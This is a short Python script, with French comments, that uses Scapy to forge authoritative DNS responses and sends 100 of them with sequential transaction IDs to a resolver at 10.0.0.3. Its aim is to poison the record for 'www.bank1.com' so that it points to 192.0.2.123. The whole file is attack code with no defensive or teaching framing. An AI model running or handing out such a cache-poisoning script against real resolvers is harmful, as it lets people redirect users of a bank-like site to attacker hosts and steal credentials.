from scapy.all import *
import time

def generate_dns_attack(dst_ip, qname, fake_ip):
    txid = 1000
    for i in range(100):
        # Créer une réponse DNS forgée
        dns_response = IP(dst=dst_ip)/UDP(dport=53)/DNS(
            id=txid,
            qr=1,  # Indiquer qu'il s'agit d'une réponse
            aa=1,  # Authoritative Answer
            qd=DNSQR(qname=qname),
            an=DNSRR(rrname=qname, ttl=86400, rdata=fake_ip)
        )
        send(dns_response, verbose=0)
        txid += 1
        time.sleep(0.1)  # Ajouter un délai de 100ms entre les paquets

if __name__ == "__main__":
    target_dns_resolver = "10.0.0.3"  # IP du résolveur DNS
    generate_dns_attack(target_dns_resolver, "www.bank1.com", "192.0.2.123")
